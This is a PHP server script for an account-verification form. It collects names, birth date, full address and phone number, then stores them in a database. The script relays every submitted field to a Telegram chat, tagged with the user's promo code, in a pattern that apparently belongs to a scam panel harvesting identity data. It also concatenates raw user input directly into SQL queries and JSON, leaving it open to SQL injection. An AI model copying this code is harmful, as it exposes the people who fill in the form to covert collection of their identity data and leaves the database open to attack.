<?
error_reporting(0);
session_start();
include_once '../_config.php';
$inputJSON = file_get_contents('php://input');
$input = json_decode($inputJSON, TRUE);

if($USER['verified_status'] == 1){
    echo '{"success":false,"message":"Your account has already been verified."}';
    exit();
}elseif($USER['verified_status'] == 2){
    echo '{"success":false,"message":"Your account is already under review."}';
    exit();
}

$missing_fields = array();

if (empty($input['first_name'])) {
$missing_fields[] = 'first_name';
}

if (empty($input['last_name'])) {
$missing_fields[] = 'last_name';
}

if (empty($input['gender'])) {
$missing_fields[] = 'gender';
}

if (empty($input['day']) || empty($input['month']) || empty($input['year'])) {
$missing_fields[] = 'birth_date';
} else {
$birth_date = $input['day'].$input['month'].$input['year'];
}

if (empty($input['country'])) {
$missing_fields[] = 'country';
}

if (empty($input['city'])) {
$missing_fields[] = 'city';
}

if (empty($input['street_address'])) {
$missing_fields[] = 'street_address';
}

if (empty($input['house'])) {
$missing_fields[] = 'house';
}

if (empty($input['phone_number'])) {
$missing_fields[] = 'phone_number';
}

if (!empty($missing_fields)) {
$missing_fields_str = implode(", ", $missing_fields);
echo '{"success":false,"message":"Fill in the following fields: '.$missing_fields_str.'."}';
} else {
    $first_name = $input['first_name'];
    $last_name = $input['last_name'];
    $middle_name = $input['middle_name'];
    $gened = $input['gender'];
    $country = $input['country'];
    $city = $input['city'];
    $street_address = $input['street_address'];
    $house = $input['house'];
    $apartament = $input['apartment'];
    $zip = $input['zip'];
    $phone_number = $input['phone_number'];

    $message = "✅ [ВЕРИФИКАЦИЯ]

Пользователь: {$USER['name']}
Промокод: {$USER_PROMO['promo']}
Данные:
first_name: " . $first_name . "
last_name: " . $last_name . "
middle_name: " . $middle_name . "
gender: " . $gened . "
birth_date: " . $birth_date . "
country: " . $country . "
city: " . $city . "
street_address: " . $street_address . "
house: " . $house . "
apartment: " . $apartament . "
zip: " . $zip . "
phone_number: " . $phone_number . "

UUID: {$USER['uuid']}
";

    sendTelegramMessage($chat_id, $message, $bot_token);

    $data_verif = '{
"first_name":"' . $first_name . '",
"last_name":"' . $last_name . '",
"middle_name":"' . $middle_name . '",
"gender":"' . $gened . '",
"birth_date":"' . $birth_date . '",
"country":"' . $country . '",
"city":"' . $city . '",
"street_address":"' . $street_address . '",
"house":"' . $house . '",
"apartment":"' . $apartament . '",
"zip":"' . $zip . '",
"phone_number":"' . $phone_number . '"
}';

    $db->query('UPDATE users SET verified_status = 2 WHERE uuid="' . $_SESSION['uuid'] . '";');
    $db->query("INSERT INTO verifed (uuid, text, status) VALUES ('".$_SESSION['uuid']."', '".$data_verif."', '0')");

    echo '{
"success":true,
"message":"The data was successfully sent for verification.",
"data":'.$data_verif.'
}';
}
?>